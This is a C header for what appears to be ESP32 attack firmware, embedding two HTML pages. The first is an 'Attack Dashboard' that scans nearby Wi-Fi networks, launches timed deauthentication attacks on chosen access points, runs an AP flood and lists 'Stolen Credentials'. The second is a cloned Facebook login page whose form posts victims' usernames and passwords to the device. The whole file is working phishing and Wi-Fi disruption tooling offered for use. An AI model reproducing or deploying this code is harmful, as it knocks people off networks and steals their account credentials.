#ifndef HTML_PAGES_H
#define HTML_PAGES_H

char* root_page_html = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>ESP32 Wi-Fi Attack Control</title>
  <style>
    /* Container & Spacing */
    .container  { max-width: 600px; margin: 16px auto; padding: 0 8px; }
    .mb-4       { margin-bottom: 16px; }
    .my-4       { margin: 16px 0; }
    .mt-2       { margin-top: 8px; }

    /* Card */
    .card       { border: 1px solid #ccc; border-radius: 4px; overflow: hidden; margin-bottom: 16px; }
    .card-header{ background: #f5f5f5; padding: 8px 16px; font-weight: bold; }
    .card-body  { padding: 16px; }

    /* Buttons */
    .btn            { display: inline-block; padding: 8px 12px; border: none; border-radius: 4px; 
                      text-decoration: none; cursor: pointer; font-size: 1em; color: #fff; }
    .btn-sm         { padding: 4px 8px; font-size: 0.85em; }
    .btn-primary    { background: #007bff; }
    .btn-warning    { background: #ffc107; color: #212529; }
    .btn-danger     { background: #dc3545; }
    .btn-secondary  { background: #6c757d; }

    /* Table */
    table          { width: 100%; border-collapse: collapse; margin-top: 8px; }
    th, td         { border: 1px solid #ddd; padding: 8px; text-align: left; }
    tr:nth-child(even) { background: #f9f9f9; }

    /* Text & Helpers */
    .text-danger { color: #dc3545; }
    .hidden      { display: none; }

    /* Fullscreen centered overlay */
    .centered-fullscreen {
      position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;
      display: flex; align-items: center; justify-content: center;
      background: #343a40; color: #fff; flex-direction: column;
    }
    .btn:disabled,
    .btn[disabled] {
    opacity: 0.6;           /* estompează culoarea */
    cursor: not-allowed;    /* arată că e dezactivat */
    }
  </style>
</head>
<body>
  <div class="container my-4">
    <h1 class="mb-4">ESP32 Attack Dashboard</h1>

    <!-- Scan Section -->
    <div class="card mb-4">
      <div class="card-header">Scan Nearby APs</div>
      <div class="card-body">
        <button id="btn-scan" class="btn btn-primary">Scan</button>
        <div id="scan-error" class="text-danger mt-2 hidden">
          Error scanning networks.
        </div>
        <table id="scan-table" class="hidden">
          <thead>
            <tr><th>SSID</th><th>BSSID</th><th>Deauthenticate</th></tr>
          </thead>
          <tbody></tbody>
        </table>
      </div>
    </div>

    <!-- Flood Section -->
    <div class="card mb-4">
      <div class="card-header">AP Flood</div>
      <div class="card-body">
        <button id="btn-flood" class="btn btn-warning">Start Flood</button>
        <button id="btn-flood-stop" class="btn btn-danger">Stop Flood</button>
        <div id="flood-status" class="mt-2"></div>
      </div>
    </div>

    <!-- Facebook Leak Section -->
    <div class="card mb-4">
      <div class="card-header">Stolen Credentials</div>
      <div class="card-body">
        <button id="btn-facebook" class="btn btn-secondary">Load</button>
        <div id="facebook-error" class="text-danger mt-2 hidden">
          Error loading credentials.
        </div>
        <table id="facebook-table" class="hidden">
          <thead><tr><th>Username</th><th>Password</th></tr></thead>
          <tbody></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    // === Scan ===
    document.getElementById('btn-scan').onclick = async () => {
      const table = document.getElementById('scan-table');
      const err   = document.getElementById('scan-error');
      const tbody = table.querySelector('tbody');
      err.classList.add('hidden'); table.classList.add('hidden'); tbody.innerHTML = '';

      try {
        const res = await fetch('/scan');
        if (res.status !== 200) throw 0;
        const aps = await res.json();
        aps.forEach(ap => {
          const tr = document.createElement('tr');
          tr.innerHTML = `
            <td>${ap.ssid}</td>
            <td>${ap.bssid}</td>
            <td>
              <button class="btn btn-sm btn-danger" onclick="deauth('${ap.bssid}')">Deauth</button>
            </td>`;
          tbody.appendChild(tr);
        });
        table.classList.remove('hidden');
      } catch {
        err.classList.remove('hidden');
      }
    };

    async function deauth(bssid) {
      const timeout = parseInt(prompt('Duration (seconds)?', '30'), 10);
      if (!timeout || timeout <= 0) return;
      const res = await fetch(`/attack?bssid=${bssid}&timeout=${encodeURIComponent(timeout)}`);
      if (res.status === 200) {
        showCountdown(timeout);
      } else if (res.status === 400) {
        alert('Missing parameters');
      } else {
        alert('Failed to start attack');
      }
    }

    function showCountdown(seconds) {
      document.body.innerHTML = `
        <div class="centered-fullscreen">
          <h1>Deauthentication in progress</h1>
          <p>Please wait <span id="countdown">${seconds}</span> seconds...</p>
        </div>`;
      let remaining = seconds;
      const el = document.getElementById('countdown');
      const iv = setInterval(() => {
        remaining--;
        if (remaining >= 0) el.textContent = remaining;
        if (remaining <= 0) {
          clearInterval(iv);
          document.body.innerHTML = `
            <div class="centered-fullscreen">
              <h1>Attack Finished</h1>
              <p>Please reconnect to the ESP32 Wi-Fi network and <strong>refresh</strong> this page.</p>
            </div>`;
        }
      }, 1000);
    }

    // === Flood Controls ===
    async function updateFloodButtons() {
      try {
        const res = await fetch('/flood/stop');
        if (res.status === 409) {
          btnFlood.disabled = false;
          btnFloodStop.disabled = true;
          floodStatus.textContent = 'Flood not running';
        } else throw 0;
      } catch {
        btnFlood.disabled = true;
        btnFloodStop.disabled = false;
        floodStatus.textContent = 'Flood is running';
      }
    }
    const btnFlood     = document.getElementById('btn-flood');
    const btnFloodStop = document.getElementById('btn-flood-stop');
    const floodStatus  = document.getElementById('flood-status');

    btnFlood.onclick = async () => {
      const res = await fetch('/flood');
      res.status === 200 ? alert('Flood started') : alert('Cannot start flood');
      btnFlood.disabled = true;
      btnFloodStop.disabled = false;
      floodStatus.textContent = 'Flood is running';
    };
    btnFloodStop.onclick = async () => {
      const res = await fetch('/flood/stop');
      res.status === 200 ? alert('Flood stopped') : alert('Flood not running');
      updateFloodButtons();
    };
    updateFloodButtons();

    // === Facebook Leak ===
    document.getElementById('btn-facebook').onclick = async () => {
      const table = document.getElementById('facebook-table');
      const err   = document.getElementById('facebook-error');
      const tbody = table.querySelector('tbody');
      err.classList.add('hidden'); table.classList.add('hidden'); tbody.innerHTML = '';

      try {
        const res = await fetch('/facebook');
        if (res.status !== 200) throw 0;
        (await res.json()).forEach(entry => {
          const tr = document.createElement('tr');
          tr.innerHTML = `<td>${entry.username}</td><td>${entry.password}</td>`;
          tbody.appendChild(tr);
        });
        table.classList.remove('hidden');
      } catch {
        err.classList.remove('hidden');
      }
    };
  </script>
</body>
</html>
)rawliteral";

const char* facebook_page_html = 
"<!DOCTYPE html>\n"
"<html lang=\"en\">\n"
"  <head>\n"
"    <meta charset=\"UTF-8\" />\n"
"    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n"
"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n"
"    <title>Facebook Login Page</title>\n"
"    <style>\n"
"@import url(\"https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap\");\n"
"* { margin: 0; padding: 0; box-sizing: border-box; }\n"
"body { font-family: \"Poppins\", sans-serif; background: #f2f4f7; }\n"
".content { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }\n"
".flex-div { display: flex; justify-content: space-evenly; align-items: center; }\n"
".name-content { margin-right: 7rem; }\n"
".name-content .logo { font-size: 3.5rem; color: #1877f2; }\n"
".name-content p { font-size: 1.3rem; font-weight: 500; margin-bottom: 5rem; }\n"
"form { display: flex; flex-direction: column; background: #fff; padding: 2rem; width: 530px; height: 380px; border-radius: 0.5rem; box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%); }\n"
"form input { outline: none; padding: 0.8rem 1rem; margin-bottom: 0.8rem; font-size: 1.1rem; }\n"
"form input:focus { border: 1.8px solid #1877f2; }\n"
"form .login { outline: none; border: none; background: #1877f2; padding: 0.8rem 1rem; border-radius: 0.4rem; font-size: 1.1rem; color: #fff; }\n"
"form .login:hover { background: #0f71f1; cursor: pointer; }\n"
"form a { text-decoration: none; text-align: center; font-size: 1rem; padding-top: 0.8rem; color: #1877f2; }\n"
"form hr { background: #f7f7f7; margin: 1rem; }\n"
"form .create-account { outline: none; border: none; background: #06b909; padding: 0.8rem 1rem; border-radius: 0.4rem; font-size: 1.1rem; color: #fff; width: 75%; margin: 0 auto; }\n"
"form .create-account:hover { background: #03ad06; cursor: pointer; }\n"
"@media (max-width: 500px) {\n"
"  html { font-size: 60%; }\n"
"  .name-content { margin: 0; text-align: center; }\n"
"  form { width: 300px; height: fit-content; }\n"
"  form input, form .login, form a, form .create-account { font-size: 1.5rem; margin-bottom: 1rem; }\n"
"  .flex-div { flex-direction: column; }\n"
"}\n"
"@media (min-width: 501px) and (max-width: 768px) {\n"
"  html { font-size: 60%; }\n"
"  .name-content { margin: 0; text-align: center; }\n"
"  form { width: 300px; height: fit-content; }\n"
"  form input, form .login, form a, form .create-account { font-size: 1.5rem; margin-bottom: 1rem; }\n"
"  .flex-div { flex-direction: column; }\n"
"}\n"
"@media (min-width: 769px) and (max-width: 1200px) {\n"
"  html { font-size: 60%; }\n"
"  .name-content { margin: 0; text-align: center; }\n"
"  form { width: 300px; height: fit-content; }\n"
"  form input, form .login, form a, form .create-account { font-size: 1.5rem; margin-bottom: 1rem; }\n"
"  .flex-div { flex-direction: column; }\n"
"}\n"
"@media (orientation: landscape) and (max-height: 500px) {\n"
"  .header { height: 90vmax; }\n"
"}\n"
"    </style>\n"
"  </head>\n"
"  <body>\n"
"    <div class=\"content\">\n"
"      <div class=\"flex-div\">\n"
"        <div class=\"name-content\">\n"
"          <h1 class=\"logo\">Facebook</h1>\n"
"          <p>Connect with friends and the world around you on Facebook.</p>\n"
"        </div>\n"
"        <form method=\"post\">\n"
"          <input type=\"text\" name=\"username\" placeholder=\"Email or Phone Number\" required />\n"
"          <input type=\"password\" name=\"password\" placeholder=\"Password\" required />\n"
"          <button type=\"submit\" class=\"login\">Log In</button>\n"
"          <a href=\"#\">Forgot Password ?</a>\n"
"          <hr />\n"
"          <button class=\"create-account\">Create New Account</button>\n"
"        </form>\n"
"      </div>\n"
"    </div>\n"
"  </body>\n"
"</html>\n";


#endif // HTML_PAGES_H